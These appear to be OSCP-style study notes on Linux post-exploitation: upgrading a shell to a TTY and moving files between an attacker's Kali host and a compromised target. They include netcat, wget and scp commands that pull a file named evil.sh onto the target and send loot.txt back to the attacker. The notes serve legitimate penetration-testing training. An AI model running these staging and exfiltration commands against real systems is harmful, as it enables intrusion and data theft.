# Linux Enumeration

I will do **Manual Enumeration** before running LinPEAS or lse or pspy. 

Now repeat that five times.

Many OSCP boxes are designed in a way where linPEAS will not pick the PE up. But still run it once you are done with the checks below.

I assumed you got some kind of shell on a linux host. If it is a shell from a webshell, try upgrading to a more stable shell by popping one with nc (which should be native on a linux host) or a msfvenom payload. Also do the following to upgrade a shell to tty using python (or python3)

```bash
# on the target host
which python python2 python3 # check which python exist. Then use the relevant version below

python -c "import pty;pty.spawn('/bin/bash');"

python3 -c "import pty;pty.spawn('/bin/bash');"

python3 -c 'import os; os.system("/bin/sh");

```

## How to transfer files from Kali to Linux

Navigate to your tools folders and run the following (I like port 80 since it is highly likely that the target box will not have port 80 blocked)

```bash
python -m http.server 80
```

Back on your target box, navigate to a folder that you should have write and execute access.

I like using /tmp, /dev/shm, /var/tmp (default global writable directories) or if you land a shell as a user, you can use that user's home directory.

```bash
wget http://<kali ip>/<file>
```

On the off chance that you somehow cant use wget, check if your current user has its path variables set correctly

```bash
# on the target

echo $PATH 

# In general, should look something like this: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
# if somehow this is empty then just set the Path variable

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

echo $PATH # to verify

```

Ok I really dont have wget! So what now? If you ssh-ed into the host, you can use scp (Secure Copy Paste)

```bash
# on your kali

scp [OPTIONS] [[user@]src_host:]file1 [[user@]dest_host:]file2

OPTIONS
-r recursive copy
-q quiet mode

For files we can use wildcard such as *.php

# if need diff port and id_Rsa keys, put them in front for it to work

# the below examples uses id_rsa to login and transfers linpeas.sh from kali to the /home/anita path

scp -P 2222 -i id_rsa linpeas.sh anita@192.168.208.245:/home/anita

```

If not SSH, you can always see the ancient method of using nc to file transfer.

Transferring evil.sh from kali to target
```bash
# on kali
nc -lvnp 80 < evil.sh
# on target
nc <kali ip> 80 > evil.sh
```
Transferring loot.txt from target to kali
```bash
# on kali
nc -lvnp 80 > loot.txt
# on target
nc <kali ip> 80 < loot.txt
```

-------------------
